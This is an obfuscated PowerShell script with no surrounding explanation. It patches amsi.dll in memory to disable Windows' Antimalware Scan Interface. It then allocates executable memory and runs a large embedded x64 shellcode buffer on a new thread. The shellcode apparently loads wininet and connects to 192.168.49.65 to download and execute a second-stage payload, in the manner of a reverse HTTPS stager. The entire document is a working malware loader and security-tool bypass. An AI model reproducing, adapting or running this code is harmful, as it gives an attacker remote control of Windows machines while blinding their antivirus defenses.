SET-ItEm  VARiaBLe:vXF2oM  ( [tYPe]("{1}{0}{2}" -f 'ppd','A','OMAiN'));   SET-iTEM  variaBLE:RdPl3  ([typE]("{0}{3}{2}{1}{4}{5}{7}{6}"-f 'SyStem.R','tION.EMIt.ASSemBlybUI','FlEC','E','l','DERAc','SS','ce')  ) ; $1eF=  [Type]("{2}{4}{3}{0}{1}{5}"-f 'LInGCOnV','EN','s','n.cAl','yStEM.reFLECtIo','tioNS');   sEt-iTEm ("va"+"R"+"I"+"aBLe:TNj") ( [tYpE]("{0}{1}"-f'u','Int32'))  ;   Set ('C'+'2iY')  ([tYPE]("{0}{1}{2}" -f 'In','T','ptr'));  $wOzc3= [Type]("{1}{0}" -F 'TeR','HUN') ;    $059  =  [TYPE]("{4}{8}{2}{5}{0}{6}{7}{1}{3}" -f 's','aRsha','Em.RuNTi','L','s','Me.inteRoPSERviCe','.','m','ySt')  ;  Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address =  $C2IY::Add($address, 1)
                If (  (GCI  VariABLE:059).VALUe::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return  $C2IY::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    
    $SystemAssembly =  (  VarIAble VxF2om  -valuE  )::CurrentDomain.GetAssemblies() |
    &("{0}{1}{2}{3}"-f 'Where-','O','bjec','t') { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(("{0}{2}{1}" -f 'Sys','ll','tem.d')) }
    $UnsafeNativeMethods = $SystemAssembly.GetType(("{1}{4}{3}{0}{5}{7}{2}{8}{9}{6}"-f'.W','M','t','oft','icros','in32.','s','UnsafeNa','iveMeth','od'))
    
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(("{2}{1}{4}{0}{3}"-f 'a','le','GetModu','ndle','H'))
    $GetProcAddress = $UnsafeNativeMethods.GetMethod(("{2}{1}{3}{4}{0}" -f's','Proc','Get','A','ddres'), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = &("{0}{2}{1}{3}"-f 'New','bje','-O','ct') IntPtr
    $HandleRef = .("{0}{2}{3}{1}"-f 'Ne','ect','w-Ob','j') System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (.("{1}{0}{2}"-f 'w-Ob','Ne','ject') Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain =   ( VARiaBle vxf2oM -vAlUEoNLy )::CurrentDomain
    $DynAssembly = .("{1}{0}{2}"-f'bje','New-O','ct') System.Reflection.AssemblyName(("{3}{0}{2}{1}" -f'tedD','gate','ele','Reflec'))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly,   $RDpl3::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(("{1}{2}{3}{0}"-f 'e','InM','emory','Modul'), $false)
    $TypeBuilder = $ModuleBuilder.DefineType(("{3}{1}{2}{0}" -f 'Type','a','te','MyDeleg'), ("{11}{7}{1}{0}{4}{10}{8}{3}{9}{12}{6}{2}{5}" -f' Pub','s,','C','siCl','lic, S','lass','uto','as','n','a','ealed, A','Cl','ss, A'), [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor(("{3}{5}{6}{8}{1}{9}{2}{0}{4}{7}"-f', ',',','ySig','RT','Pu','S','pecialN','blic','ame',' HideB'),   $1EF::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags(("{0}{1}{2}{3}{4}" -f 'Run','time, ','Ma','n','aged'))
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', ("{3}{7}{1}{2}{6}{4}{0}{8}{5}" -f'ySig,','li','c, ','Pu','B','l','Hide','b',' NewSlot, Virtua'), $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags(("{1}{4}{3}{2}{0}"-f 'ed','Run','e, Manag','im','t'))
        
    .("{1}{2}{0}{3}" -f'Outpu','W','rite-','t') $TypeBuilder.CreateType()
}
$LoadLibraryAddr = &("{1}{2}{0}{3}{4}"-f'ocA','Ge','t-Pr','dd','ress') kernel32.dll LoadLibraryA
$LoadLibraryDelegate = .("{2}{3}{0}{1}"-f'teTyp','e','Get-Dele','ga') @([String]) ([IntPtr])
$LoadLibrary =   $059::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
$GetProcAddressAddr = &("{0}{3}{2}{1}" -f'Get','dress','rocAd','-P') kernel32.dll GetProcAddress
$GetProcAddressDelegate = &("{4}{1}{0}{2}{3}" -f'egat','Del','eTyp','e','Get-') @([IntPtr], [String]) ([IntPtr])
$GetProcAddress =   (  VaRIaBLE ('0'+'59')  -vAlue )::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
$VirtualProtectAddr = .("{2}{1}{0}"-f 's','res','Get-ProcAdd') kernel32.dll VirtualProtect
$VistualProtectDelegate =  &("{1}{0}{2}"-f '-Deleg','Get','ateType') @([IntPtr], [UIntPtr], [UInt32],   ( itEm ("VA"+"r"+"i"+"ABle:Tnj")).VaLue.MakeByRefType()) ([Bool])
$VirtualProtect =   ( GeT-ChiLdIteM  ("VaRiA"+"Ble:05"+"9")).VaLUE::GetDelegateForFunctionPointer($VirtualProtectAddr, $VistualProtectDelegate)


If ( (VaRIABLe  ('C'+'2IY')  -VALUEOnlY)::Size -eq 8) {
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       
        0x49, 0x89, 0x5B, 0x08, 
        0x49, 0x89, 0x6B, 0x10, 
        0x49, 0x89, 0x73, 0x18, 
        0x57,                   
        0x41, 0x56,             
        0x41, 0x57,             
        0x48, 0x83, 0xEC, 0x70  
    )
} Else {
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             
        0x55,                   
        0x8B, 0xEC,             
        0x83, 0xEC, 0x18,       
        0x53,                   
        0x56                    
    )
}


$hModule = $LoadLibrary.Invoke(("{1}{2}{0}" -f'l','amsi.d','l'))
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule, ("{0}{1}{3}{5}{4}{2}" -f'D','l','t','lGet','c','ClassObje'))
[IntPtr]$targetedAddress =  (  ITeM  VariABle:wozC3 ).VaLuE::FindAddress($DllGetClassObjectAddress, $egg)

$oldProtectionBuffer = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | .("{2}{0}{1}"-f 'ut-N','ull','O')

$patch = [byte[]] (
    0x31, 0xC0,    
    0xC3           
)
 ( ChiLDItem ("v"+"aRI"+"ABLE:"+"059")  ).VaLUE::Copy($patch, 0, $targetedAddress, 3)

$a = 0
$VirtualProtect.Invoke($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | &("{0}{1}{2}" -f'O','u','t-Null')


function LookupFunc {

        Param ($moduleName, $functionName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
                [Parameter(Position = 1)] [Type] $delType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0x41,0x51,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xe,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x36,0x35,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x6e,0x0,0x0,0x0,0x2f,0x4f,0x62,0x55,0x77,0x35,0x69,0x39,0x36,0x31,0x4f,0x4b,0x48,0x52,0x34,0x5a,0x46,0x35,0x63,0x72,0x45,0x76,0x77,0x76,0x6b,0x36,0x51,0x38,0x4f,0x4b,0x56,0x33,0x31,0x57,0x36,0x57,0x72,0x46,0x57,0x52,0x39,0x32,0x62,0x34,0x41,0x41,0x47,0x53,0x5f,0x44,0x30,0x48,0x33,0x74,0x64,0x68,0x4a,0x6f,0x5a,0x61,0x43,0x6f,0x43,0x4c,0x2d,0x74,0x7a,0x44,0x72,0x4f,0x6c,0x6c,0x34,0x6e,0x62,0x64,0x61,0x51,0x69,0x6f,0x4a,0x67,0x6a,0x47,0x48,0x58,0x46,0x59,0x35,0x72,0x39,0x75,0x4a,0x74,0x63,0x70,0x6e,0x65,0x55,0x63,0x68,0x5a,0x30,0x4b,0x42,0x46,0x5a,0x5a,0x4f,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5


[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
